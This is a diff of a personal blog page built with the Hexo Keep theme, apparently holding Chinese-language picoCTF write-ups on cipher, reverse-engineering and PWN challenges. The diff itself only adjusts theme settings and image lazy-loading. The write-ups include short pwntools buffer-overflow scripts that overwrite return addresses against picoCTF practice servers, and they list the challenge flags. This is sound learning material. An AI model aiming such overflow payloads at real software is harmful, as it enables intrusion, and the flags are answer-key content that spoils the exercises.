@@ -35,7 +35,7 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":true,"img_link":"/images/zfb.jpg","text":"请作者喝杯咖啡","icon":"/images/tea.svg"}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -45,6 +45,8 @@
 
 <body>
 <div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
     
 
     
@@ -119,9 +121,15 @@
                         </li>
                     
                     
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
                 </ul>
             </div>
             <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
                 <div class="icon-item menu-bar">
                     <div class="menu-bar-middle"></div>
@@ -270,6 +278,10 @@
         
         
         
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
     </div>
 
     
@@ -288,7 +300,12 @@
 <p>key <code>CYLAB</code></p>
 <p>cipher:  <code>rgnoDVD{O0NU_WQ3_G1G3O3T3_A1AH3S_cc82272b}</code></p>
 <p>题目给了密文和密钥，用随波逐流打开，解密，发现是维吉尼亚加密</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707145151937.png"  alt="image-20250707145151937"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707145151937.png"
+                        alt="image-20250707145151937"
+                 ></p>
 <p>flag:<strong>picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q}</strong></p>
 <h3 id="basic-mod1"><a href="#basic-mod1" class="headerlink" title="basic-mod1"></a>basic-mod1</h3><p>题目信息</p>
 <p>描述： 我们发现这个奇怪的消息在服务器上传递，我们认为我们有一个有效的 decrpytion 方案。取每个数字 mod 37 并将其映射到以下字符集：0-25 是字母表（大写），26-35 是十进制数字，36 是下划线。以 picoCTF 标志格式包装解密的消息（即 picoCTF{decrypted_message}）</p>
@@ -315,7 +332,12 @@
 
 
 <p>正如代码中的注释一样，用户输入密码，进行Base64编码，调用函数检验编码厚的数值是否符合指定字符，所以密码就是指定字符Base64解码</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707160725424.png"  alt="image-20250707160725424"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707160725424.png"
+                        alt="image-20250707160725424"
+                 ></p>
 <p>flag：<strong>picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}</strong></p>
 <h3 id="GDB-test"><a href="#GDB-test" class="headerlink" title="GDB test"></a>GDB test</h3><p>题目信息</p>
 <p>你能得到这面旗帜吗？</p>
@@ -324,45 +346,90 @@
 
 <p>解密</p>
 <p>按照给的命令进行操作</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707160953950.png"  alt="image-20250707160953950"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707160953950.png"
+                        alt="image-20250707160953950"
+                 ></p>
 <p>flag: <strong>picoCTF{d3bugg3r_dr1v3_7776d758}</strong></p>
 <h3 id="fresh-java"><a href="#fresh-java" class="headerlink" title="fresh-java"></a>fresh-java</h3><p>题目信息</p>
 <p>你能得到这面旗帜吗？对这个 <a class="link"   target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/197/KeygenMe.class" >Java 程序<i class="fas fa-external-link-alt"></i></a>进行逆向工程</p>
 <p>用jad-gui打开这个文件，发现该密文已将被定义好了</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707161219444.png"  alt="image-20250707161219444"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707161219444.png"
+                        alt="image-20250707161219444"
+                 ></p>
 <p>flag：<strong>picoCTF{700l1ng_r3qu1r3d_738cac89}</strong></p>
 <h3 id="file-run1"><a href="#file-run1" class="headerlink" title="file-run1"></a>file-run1</h3><p>题目信息</p>
 <p>已为您提供一个程序，如果您尝试在命令行上运行它会发生什么？</p>
 <p>解密</p>
 <p>首先要为程序赋权限  <code>chmod +x ru</code></p>
 <p>运行该程序并且执行命令.&#x2F;run</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707163210981.png"  alt="image-20250707163210981"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707163210981.png"
+                        alt="image-20250707163210981"
+                 ></p>
 <p>flag:<strong>picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b}</strong></p>
 <h3 id="file-run2"><a href="#file-run2" class="headerlink" title="file-run2"></a>file-run2</h3><p>题目信息</p>
 <p>另一个程序，但这一次，它似乎需要一些输入。如果您尝试在命令行上运行它并输入 “Hello！”会发生什么情况？</p>
 <p>解密</p>
 <p>首先要为程序赋权限  <code>chmod +x ru</code></p>
 <p>运行该程序并且执行命令.&#x2F;run Hello!</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707162758640.png"  alt="image-20250707162758640"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707162758640.png"
+                        alt="image-20250707162758640"
+                 ></p>
 <p>flag:<strong>picoCTF{F1r57_4rgum3n7_f65ed63e}</strong></p>
 <h3 id="Bbbbloat"><a href="#Bbbbloat" class="headerlink" title="Bbbbloat"></a>Bbbbloat</h3><p>题目信息</p>
 <p>你能得到这面旗帜吗？对这个<a class="link"   target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/47/bbbbloat" >二进制文件<i class="fas fa-external-link-alt"></i></a>进行逆向工程。</p>
 <p>解密</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707165659990.png"  alt="image-20250707165659990"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707165659990.png"
+                        alt="image-20250707165659990"
+                 ></p>
 <p>分析得到，最喜欢的是数字应该为549255</p>
 <p>为文件赋权限 <code>chmod +x Bbbbloat</code></p>
 <p>运行程序<code>./Bbbbloat</code></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707165748259.png"  alt="image-20250707165748259"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707165748259.png"
+                        alt="image-20250707165748259"
+                 ></p>
 <p>flag：<strong>picoCTF{cu7_7h3_bl047_44f74a60}</strong></p>
 <h3 id="unpackme"><a href="#unpackme" class="headerlink" title="unpackme"></a>unpackme</h3><p>题目描述</p>
 <p>你能得到这面旗帜吗？对这个<a class="link"   target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/204/unpackme-upx" >二进制文件<i class="fas fa-external-link-alt"></i></a>进行逆向工程。</p>
 <p>解密</p>
 <p>文件以upx结尾，尝试upx脱壳</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707205131371.png"  alt="image-20250707205131371"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707205131371.png"
+                        alt="image-20250707205131371"
+                 ></p>
 <p>之后拖入ida中</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707205428033.png"  alt="image-20250707205428033"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250707205428033.png"
+                        alt="image-20250707205428033"
+                 ></p>
 <p>发现最喜爱的数字是754635</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707205352953.png" ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250707205352953.png"
+                       
+                 ></p>
 <p>flag: <strong>picoCTF{up&gt;&lt;_m3_f7w_e510a27f}</strong></p>
 <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="RPS"><a href="#RPS" class="headerlink" title="RPS"></a>RPS</h3><p>题目描述</p>
 <p>这是一个对你玩石头剪刀布的程序。我听说如果你连续赢了 5 次，就会发生好事。可以下载带有标记已编辑的程序源代码 <a class="link"   target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/145/game-redacted.c" >这里 <i class="fas fa-external-link-alt"></i></a>。</p>
@@ -398,14 +465,29 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">static void data_read() &#123;</span><br><span class="line">  char entry[4];</span><br><span class="line">  long entry_number;</span><br><span class="line">  char output[100];</span><br><span class="line">  int r;</span><br><span class="line"></span><br><span class="line">  memset(output, &#x27;\0&#x27;, 100);</span><br><span class="line">  </span><br><span class="line">  printf(&quot;Please enter the entry number of your data:\n&quot;);</span><br><span class="line">  r = tgetinput(entry, 4);</span><br><span class="line">  // Timeout on user input</span><br><span class="line">  if(r == -3)</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Goodbye!\n&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  if ((entry_number = strtol(entry, NULL, 10)) == 0) &#123;//尝试将 entry 字符串的开头部分解析成一个十进制的长整型数值，</span><br><span class="line">    puts(flag);</span><br><span class="line">    fseek(stdin, 0, SEEK_END);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  entry_number--;</span><br><span class="line">  strncpy(output, data[entry_number], input_lengths[entry_number]);</span><br><span class="line">  puts(output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>所以重点就是<code>((entry_number = strtol(entry, NULL, 10)) == 0)</code>的输出结果为0</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708105757613.png"  alt="image-20250708105757613"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708112024405.png"  alt="image-20250708112024405"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708105757613.png"
+                        alt="image-20250708105757613"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708112024405.png"
+                        alt="image-20250708112024405"
+                 ></p>
 <p>flag:<strong>picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}</strong></p>
 <h3 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h3><p>题目信息</p>
 <p>让我们从简单的开始，你能溢出正确的缓冲区吗？该程序可<a class="link"   target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/173/vuln" >在此处<i class="fas fa-external-link-alt"></i></a>获得。您可以查看源代码 <a class="link"   target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/173/vuln.c" >这里 <i class="fas fa-external-link-alt"></i></a>。</p>
 <p>解密</p>
 <p>主函数</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708113508462.png"  alt="image-20250708113508462"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708113508462.png"
+                        alt="image-20250708113508462"
+                 ></p>
 <p> <code>signal(11, sigsegv_handler)</code>当程序发生段错误（即收到信号 11，也就是 <code>SIGSEGV</code>）时，不执行默认操作（崩溃），而是跳转到你定义的 <code>sigsegv_handler</code> 函数进行处理。 </p>
 <ul>
 <li>当你的程序试图访问非法内存地址（如未分配的内存、只读内存、已释放的内存等）时，操作系统会发送这个信号给程序。</li>
@@ -422,10 +504,20 @@
 <p>它包含了读取flag,并把flag输出在终端</p>
 <p>而在 Linux&#x2F;Unix 系统中，<code>/bin/sh</code> 是一个指向系统默认 shell（如 Bash）的可执行文件</p>
 <p><code>sigsegv_handler</code>函数</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708113612456.png" ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708113612456.png"
+                       
+                 ></p>
 <p>该函数会输出flag</p>
 <p>所以只需要实现就可以输出flag</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708115309806.png"  alt="image-20250708115309806"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708115309806.png"
+                        alt="image-20250708115309806"
+                 ></p>
 <h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;saturn.picoctf.net&quot;, 62318)</span><br><span class="line">p.sendline(b&#x27;a&#x27;*20)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -441,8 +533,18 @@
 <h2 id="buffer-overflow-1"><a href="#buffer-overflow-1" class="headerlink" title="buffer overflow 1"></a>buffer overflow 1</h2><p>题目描述</p>
 <p>控制退货地址现在我们开始烹饪了！您可以溢出缓冲区并返回到<a class="link"   target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/187/vuln" >程序<i class="fas fa-external-link-alt"></i></a>中的 flag 函数。你可以<a class="link"   target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/187/vuln.c" >在这里<i class="fas fa-external-link-alt"></i></a>查看源代码。</p>
 <p>解密</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708153920298.png"  alt="image-20250708153920298"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708143530328.png"  alt="image-20250708143530328"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708153920298.png"
+                        alt="image-20250708153920298"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708143530328.png"
+                        alt="image-20250708143530328"
+                 ></p>
 <p><strong><code>var_4</code> 是什么？</strong></p>
 <ul>
 <li>在汇编或反编译工具（如 IDA Pro）中，<code>var_4</code> 是一个由工具自动生成的名称，用于表示一个位于栈上的局部变量。它通常是原始C代码中没有明确命名的变量，或者是编译器为了优化或内部使用而创建的栈空间。</li>
@@ -455,7 +557,12 @@
 <li>因此，<code>var_4</code> 的大小是 <strong>4 字节</strong>。</li>
 </ul>
 <p>所以垃圾字节要填充36+4+4&#x3D;44个字节</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708154044161.png"  alt="win"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708154044161.png"
+                        alt="win"
+                 ></p>
 <p><code>win</code>是后门函数</p>
 <p>填充它的地址</p>
 <h4 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;saturn.picoctf.net&quot;, 59895)</span><br><span class="line">p.sendline(b&#x27;a&#x27;*44+p32(0x080491F6))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -469,14 +576,34 @@
 <h3 id="buffer-overflow-2"><a href="#buffer-overflow-2" class="headerlink" title="buffer overflow 2"></a>buffer overflow 2</h3><p>题目描述</p>
 <p>控制返回地址和参数这一次，您需要控制您返回的函数的参数！您可以从此<a class="link"   target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/144/vuln" >程序<i class="fas fa-external-link-alt"></i></a>中获取标志吗？你可以<a class="link"   target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c/144/vuln.c" >在这里<i class="fas fa-external-link-alt"></i></a>查看源代码</p>
 <p>解密</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708171855335.png"  alt="image-20250708171855335"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708171855335.png"
+                        alt="image-20250708171855335"
+                 ></p>
 <p>s距离返回地址是6C+4个字节</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708172840005.png"  alt="image-20250708172840005"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708172840005.png"
+                        alt="image-20250708172840005"
+                 ></p>
 <p>要传参，32位是参数从<strong>右到左</strong>依次压入栈中</p>
 <p>win的地址</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708173339016.png"  alt="image-20250708173339016"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708173339016.png"
+                        alt="image-20250708173339016"
+                 ></p>
 <h4 id="gdb动调查看"><a href="#gdb动调查看" class="headerlink" title="gdb动调查看"></a>gdb动调查看</h4><p><code>python wp.py</code></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708194558739.png"  alt="image-20250708194558739"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708194558739.png"
+                        alt="image-20250708194558739"
+                 ></p>
 <p>执行的函数列表</p>
 <h4 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># 本地</span><br><span class="line"># ex = process(&#x27;./vuln&#x27;)</span><br><span class="line"># 远程</span><br><span class="line">p = remote(&#x27;saturn.picoctf.net&#x27;, 62974)</span><br><span class="line">payload = b&#x27;a&#x27;*112+p32(0x08049296)+p32(0)+p32(0xCAFEF00D)+p32(0xF00DF00D)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"># p.inter</span><br><span class="line">print(p.recvall())</span><br></pre></td></tr></table></figure>
 
@@ -495,18 +622,48 @@
 <p>解密</p>
 <p>这一题我错了很久，最后发现考了堆栈平衡:crying_cat_face:</p>
 <p>但是也学到了一些gdb调试获取信息的方法</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708211430828.png"  alt="image-20250708211430828"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708211442960.png"  alt="image-20250708211442960"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708205411585.png"  alt="image-20250708205411585"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708211430828.png"
+                        alt="image-20250708211430828"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708211442960.png"
+                        alt="image-20250708211442960"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708205411585.png"
+                        alt="image-20250708205411585"
+                 ></p>
 <p><strong>gdb调试获得相关信息</strong></p>
 <p><code>readelf -s vuln</code>显示所有函数的信息（在gdb调试之前）</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708210826386.png"  alt="image-20250708210826386"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708210826386.png"
+                        alt="image-20250708210826386"
+                 ></p>
 <p><code>p flag</code>：显示函数flag的信息</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708210712578.png"  alt="image-20250708210712578"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708210712578.png"
+                        alt="image-20250708210712578"
+                 ></p>
 <p>（gdb）disassemble vuln：找要填充的字节数（）</p>
 <p>64位时是0x40+8</p>
 <p>32位时是0x40+4</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708211147269.png"  alt="image-20250708211147269"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708211147269.png"
+                        alt="image-20250708211147269"
+                 ></p>
 <h4 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h4><p>同一个程序的每一个 <code>call</code> 指令执行时，<code>rsp</code>（栈指针）的<strong>绝对值不一定相同</strong>，但其<strong>对齐状态</strong>是保持一致的。</p>
 <p>当 <code>vuln</code> 函数通过 <code>ret</code> 指令跳转到 <code>flag</code> 函数时，<code>flag</code> 函数的入口处 <code>rsp</code> (栈指针) 可能满足 <code>rsp % 16 == 0</code> (即 16 字节对齐)。但是，<code>flag</code> 函数的序言 (prologue) 通常会 <code>push rbp</code> (将 <code>rbp</code> 压栈)，这会使 <code>rsp</code> 减去 8 字节，导致 <code>rsp % 16 == 8</code> (8 字节不对齐)。</p>
 <p>问题就出在这里：<strong>在执行任何 <code>call</code> 指令之前，<code>rsp</code> 必须是 16 字节对齐的。</strong></p>
@@ -525,7 +682,12 @@
 <p>该函数是flag被调用函数输出flag，所以在flag函数中的第一个call的地方下断点</p>
 <p><code>python 你的脚本文件名.py</code>：运行脚本</p>
 <p><code>info registers rsp</code>：查看rsp的寄存器信息</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708215558325.png"  alt="image-20250708215558325"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250708215558325.png"
+                        alt="image-20250708215558325"
+                 ></p>
 <p>看最后两位  </p>
 <p>0x48可以整除16，所以现在堆栈平衡了</p>
